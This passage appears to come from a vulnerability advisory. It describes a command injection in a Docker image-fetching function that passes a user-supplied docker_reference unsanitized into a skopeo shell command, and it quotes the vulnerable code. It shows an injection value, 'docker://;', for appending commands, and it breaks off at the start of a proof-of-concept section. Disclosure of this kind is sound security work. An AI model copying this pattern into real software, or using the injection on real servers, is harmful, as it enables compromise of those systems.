The `docker_reference` variable is then passed to the vulnerable function `get_docker_image_platform`. \n```python\ndef fetch_docker_image(docker_reference, to=None):\n    \"\"\"\n    code snipped ....\n    \"\"\"\n    platform_args = []\n    platform = get_docker_image_platform(docker_reference) # User controlled `docker_reference` passed\n   \"\"\"\n   code snipped...\n   \"\"\"\n```\n\nHowever, the `get_docker_image_plaform` function constructs a shell command with the passed `docker_reference`. The `pipes.run_command` then executes the shell command without any prior sanitization, making the function vulnerable to command injections. \n\n```python\ndef get_docker_image_platform(docker_reference):\n    \"\"\"\n    Return a platform mapping of a docker reference.\n    If there are more than one, return the first one by default.\n    \"\"\"\n    skopeo_executable = _get_skopeo_location()\n    \"\"\"\n    Constructing a shell command with user controlled variable `docker_reference`\n    \"\"\"\n    cmd = (\n        f\"{skopeo_executable} inspect --insecure-policy --raw --no-creds \"\n        f\"{docker_reference}\"\n    )\n\n    logger.info(f\"Fetching image os/arch data: {cmd}\")\n    exitcode, output = pipes.run_command(cmd) # Executing command\n    logger.info(output)\n    if exitcode != 0:\n        raise FetchDockerImageError(output)\n``` \n\nA malicious user who is able to create or add inputs to a project can inject commands. Although the command injections are blind and the user will not receive direct feedback without logs, it is still possible to cause damage to the server/container. The vulnerability appears for example if a malicious user adds a semicolon after the input of `docker://;`, it would allow appending malicious commands.\n\n### PoC\n\n1.
